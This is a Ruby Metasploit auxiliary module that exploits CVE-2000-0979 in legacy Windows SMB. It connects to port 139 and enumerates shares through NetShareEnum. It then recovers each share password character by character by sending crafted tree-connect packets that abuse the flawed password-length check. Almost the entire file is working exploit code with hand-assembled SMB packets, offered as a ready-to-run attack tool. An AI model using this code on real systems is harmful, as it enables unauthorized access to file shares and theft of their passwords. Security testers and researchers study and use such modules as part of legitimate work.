class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Rex::Text

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'CVE-2000-0979 password enumerator',
                      'Description'    => %q{
        When a client sends an authentication packet to an old Windows SMB share
        the client can determine the length on the password check. This means sending
        a zero length, the client is instantly authenticated. But this also makes it
        easy to enumerate the real password, as the password can be revealed character
        by character.

      },
                      'Author'         =>
                          [
                              'Zoltan Balazs <zoltan1.balazs@gmail.com> @zh4ck', 
                              'Azbil SecurityFriday Co Ltd' 
                          ],
                      'References'     =>
                          [
                              [ 'CVE', '2000-0979'],
                              [ 'URL', 'http://www.securityfriday.com/tools/SPC.html'],
                          ],
                      'License'        => MSF_LICENSE,
                      'Notes' =>
                          {
                              'AKA' => [
                                  'Share Password Checker'
                              ]
                          }
          ))

    register_options(
        [
            #TODO change delay to float
            OptInt.new('DELAY', [false, 'Add delay between password probes', 0]),
            OptPort.new('RPORT', [true, 'Set a port', 139])
        ])
  end

def send_recv_once(data)
  buf = ''
  begin
    sock.put(data.pack('C*'))
    buf = sock.get_once || ''
  rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
    elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
  end

  buf
end

  def run()

    delay = datastore['DELAY']
    print_status "Hello CVE-2000-0979"
    debug = datastore['DEBUG']
    connect


    def debug_puts(message,debug)
      if debug
        print_bad message
      end
    end

    def debug_hex_dump(message,debug)
      if debug
        #print_bad "todo implement hex_dump"
        #print_bad message.to_hex_dump
      end
    end

    #todo redo Object oriented
    def update_tid(packet, tid)
      tid_arr = tid.unpack('C*')
      packet.map! { |val|
          if val == "tid0" then
            tid_arr[0]
          elsif val == "tid1" then
                 tid_arr[1]
               else val
          end
      }
      return packet
    end

    def update_password(packet, nbs_length,length0, length1, byte_count0, byte_count1,password,
        share)

      new_packet = packet.map { |val|
        if val == "length0" then
          length0
        elsif val == "length1" then
          length1
        elsif val == "byte_count0" then
          byte_count0
        elsif val == "byte_count1" then
          byte_count1
        elsif val == "nbs_length" then
          nbs_length
        else val
        end

      }

      share_chars = share.chars.map {|val|
        val.ord
      }

      new_packet.insert(new_packet.find_index("share"),share_chars).flatten!
      new_packet.delete_at(new_packet.find_index("share"))

      new_packet.insert(new_packet.find_index("password"),password).flatten!
      new_packet.delete_at(new_packet.find_index("password"))

      return new_packet
    end

    def update_machine_name(packet,machine_name)
      packet.insert(packet.find_index("machine_name"),machine_name).flatten!
      packet.delete_at(packet.find_index("machine_name"))
      return packet
    end


    tree_disconnect_request = [0x00, 0x00, 0x00, 0x23, 0xff, 0x53, 0x4d, 0x42,
                               0x71, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0xc8, 0xff, 0xfe,
                               0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00 ]

    machine_name = 32.times.map{ 0x41 + Random.rand(6) }

    session_request_def = [0x81, 0x00, 0x00, 0x44, 0x20, 0x45, 0x45, 0x45,
                           0x46, 0x45, 0x47, 0x45, 0x42, 0x46, 0x46, 0x45,
                           0x4d, 0x46, 0x45, 0x43, 0x41, 0x43, 0x41, 0x43,
                           0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43,
                           0x41, 0x43, 0x41, 0x43, 0x41, 0x00, 0x20,  "machine_name", 0x00]

    session_request_def = update_machine_name(session_request_def,machine_name)

    neg_prot_req = [0x00, 0x00, 0x00, 0x2f, 0xff, 0x53, 0x4d, 0x42,
                    0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x53, 0xc8,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xfe,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x02, 0x4e, 0x54,
                    0x20, 0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32,
                    0x00]

    sess_setup_andx_req = [0x00, 0x00, 0x00, 0x9d, 0xff, 0x53, 0x4d, 0x42,
                           0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xfe,
                           0x00, 0x00, 0x04, 0x00, 0x0d, 0x75, 0x00, 0x74,
                           0x00, 0x68, 0x0b, 0x02, 0x00, 0x00, 0x00, 0x09,
                           0x06, 0x03, 0x80, 0x01, 0x00, 0x01, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x00, 0x37,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e,
                           0x64, 0x6f, 0x77, 0x73, 0x20, 0x32, 0x30, 0x30,
                           0x30, 0x20, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63,
                           0x65, 0x20, 0x50, 0x61, 0x63, 0x6b, 0x20, 0x33,
                           0x20, 0x32, 0x36, 0x30, 0x30, 0x00, 0x57, 0x69,
                           0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x32, 0x30,
                           0x30, 0x30, 0x20, 0x35, 0x2e, 0x31, 0x00, 0x00,
                           0x04, 0xff, 0x00, 0x9d, 0x00, 0x08, 0x00, 0x01,
                           0x00, 0x1e, 0x00, 0x00, 0x5c, 0x5c, 0x31, 0x39,
                           0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x32,
                           0x32, 0x2e, 0x31, 0x34, 0x31, 0x5c, 0x49, 0x50,
                           0x43, 0x24, 0x00, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f,
                           0x00 ]

    netshareenum_request = [0x00, 0x00, 0x00, 0x63, 0xff, 0x53, 0x4d, 0x42,
                           0x25, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x00, 0x00, "tid0", "tid1", 0xff, 0xfe,
                           0x00, 0x00, 0x14, 0x00, 0x0e, 0x13, 0x00, 0x00,
                           0x00, 0x08, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
                           0x00, 0x88, 0x13, 0x00, 0x00, 0x00, 0x00, 0x13,
                           0x00, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x24, 0x00, 0x5c, 0x50, 0x49, 0x50, 0x45,
                           0x5c, 0x4c, 0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x00,
                           0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x72,
                           0x4c, 0x65, 0x68, 0x00, 0x42, 0x31, 0x33, 0x42,
                           0x57, 0x7a, 0x00, 0x01, 0x00, 0x00, 0x10]

    sess_setup_andx_req_anon = [0x00, 0x00, 0x00, 0x60, 0xff, 0x53, 0x4d, 0x42,
                                0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x20, 0x01,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x0b,
                                0x00, 0x00, 0x01, 0x00, 0x0a, 0xff, 0x00, 0x00,
                                0x00, 0x68, 0x0b, 0x02, 0x00, 0x01, 0x00, 0x0a,
                                0x06, 0x02, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00,
                                0x00, 0x29, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00,
                                0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20,
                                0x32, 0x30, 0x30, 0x30, 0x20, 0x32, 0x31, 0x39,
                                0x35, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x64, 0x6f,
                                0x77, 0x73, 0x20, 0x32, 0x30, 0x30, 0x30, 0x20,
                                0x35, 0x2e, 0x30, 0x00]

    tree_connect_request_path_password = [0x00, 0x00, 0x00, "nbs_length", 0xff, 0x53, 0x4d, 0x42,
                                          0x75, 0x00, 0x00, 0x00, 0x00, 0x18, 0x20, 0x01,
                                          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x0b,
                                          0x00, 0x00, 0x01, 0x00, 0x04, 0xff, 0x00, 0x00,
                                          0x00, 0x00, 0x00,
                                          "length0", "length1", "byte_count0", "byte_count1","password",
                                          "share", 0x00, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 0x00]

    tree_disconnect = [0x00, 0x00, 0x00, 0x23, 0xff, 0x53, 0x4d, 0x42,
                       0x71, 0x00, 0x00, 0x00, 0x00, 0x18, 0x20, 0x01,
                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                       0x00, 0x00, 0x00, 0x00, "tid0", "tid1", 0xc0, 0x0b,
                       0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00]

    myhash = {}

    @client_packets = [{ "tree_disconnect_request" => tree_disconnect_request},
                      {"close1" => "close"},
                      {"session_request_def" => session_request_def},
                      {"neg_prot_req" => neg_prot_req},
                      {"sess_setup_andx_req" => sess_setup_andx_req},
                      {"netshareenum_request" => netshareenum_request},
                      {"close3" => "close"},
                      {"session_request_2" => session_request_def},
                      {"neg_prot_req_2" => neg_prot_req},
                      {"sess_setup_andx_req_anon" => sess_setup_andx_req_anon}
                       ]

    i = 0
    tid = 0
    length0, length1, byte_count0, byte_count1,password, share = 0
    shares = Array.new

    @client_packets.each_with_index { |val, idx|
      begin
        if val[val.keys[0]].to_s == "close" and sock then
          disconnect  #close
          debug_puts "Opening socket again 1",debug
          connect
          next
        elsif  !sock
          debug_puts "Opening socket again 2",debug
          connect
          next
        end

        if [ 'netshareenum_request'].include? val.keys[0] then
          packet = update_tid(val[val.keys[0]], tid)
          debug_puts "Packet updated",debug

        else
          packet = val[val.keys[0]]
        end

        debug_puts "\nclient data\n",debug
        debug_puts val.keys[0],debug

        response = send_recv_once(packet)

        if val.keys[0] == "sess_setup_andx_req" then
          tid = response[28..29]
          debug_puts "New tree ID TID !",debug
          debug_hex_dump(tid,debug)
        end

        if val.keys[0] == "session_request_def" then
          session_response = response[0]
          if (session_response.ord != 0x82) then
            print_error "Session response is not positive! Exiting."
            exit(0)
          end
        end

        if val.keys[0] == "neg_prot_req" then
          error_class = response[9]
          if (error_class.ord != 0x0) then
            print_error "Error in negotiation! Exiting."
            exit(0)
          end
        end

        if val.keys[0] == "netshareenum_request" then
          num_of_shares = response[65..66].unpack('cc').first
          print_good "Number of shares: "
          print_good "\t" + num_of_shares.to_s
          print_good "Share names: "
          num_of_shares.times do |n|
            offset = (n * 20) + 68
            share_name = response[offset..offset+15]
            shares.push(share_name)
            print_good "\t" + share_name
          end

        end

      rescue IOError, SocketError, SystemCallError => e
        print_error e.message
        print_error e.backtrace.inspect
        exit(-1)
      end
    }


    #Start brute-forcing the password
    shares.each { |share|
      next_share = FALSE
      share = share.delete("\000")

      nbs_length = 0x33 + share.length
      length0 = 0x01
      length1 = 0x00
      byte_count0 = 0x08 + share.length
      byte_count1 = 0x00
      password = [0x20]   #TODO skip lowercase letters

      print_status "Brute-forcing password for share: " + share

      while true
        begin

          packet = update_password(tree_connect_request_path_password,nbs_length, length0, length1,
                                   byte_count0, byte_count1,password,share)
          debug_puts "Packet updated",debug
          response = send_recv_once(packet)

          if ((response[9].unpack('C') +
              response[10].unpack('C') +
              response[11].unpack('C') +
              response[12].unpack('C'))[0] == 0) then

            debug_puts 'Auth success, trying next char',debug

            if (password[0] ==0x20 and password[1]==0x20)
              print_good "Empty password works!\n"
              next_share=TRUE
              break
            end

            length0 = length0 + 1
            nbs_length = nbs_length + 1
            byte_count0 = byte_count0 + 1

            password.push(0x20)

            tid = response[28..29]
            debug_puts "New tree ID TID !",debug
            debug_hex_dump(tid,debug)


            packet = update_tid(tree_disconnect, tid)
            response = send_recv_once(tree_disconnect)

          else
            password[length0-1] = password[length0-1] + 1

            password.each { |val|
              print val.chr()

            }
            print "\r"

            if delay > 0 then
              sleep(delay)
              
            end
	    sleep(0.01)
	    
            if (password[length0-1] > 128)  then
              password.each { |val|
                if (val < 128) then
                  print val.chr()
                end
              }

              if length0 > 1
                print_status 
                print_good '<- No more characters to try, this should be your password, yikes :) '+"\n"
              else
                print_status "Password not found :("+"\n"
              end

              next_share=TRUE
            end
          end

        rescue IOError, SocketError, SystemCallError => e
          print_error e.message
          print_error e.backtrace.inspect
          exit(-1)
        end

        if (next_share)   #moving on to the next share
          break
        end
      end

    }

    disconnect

  end
end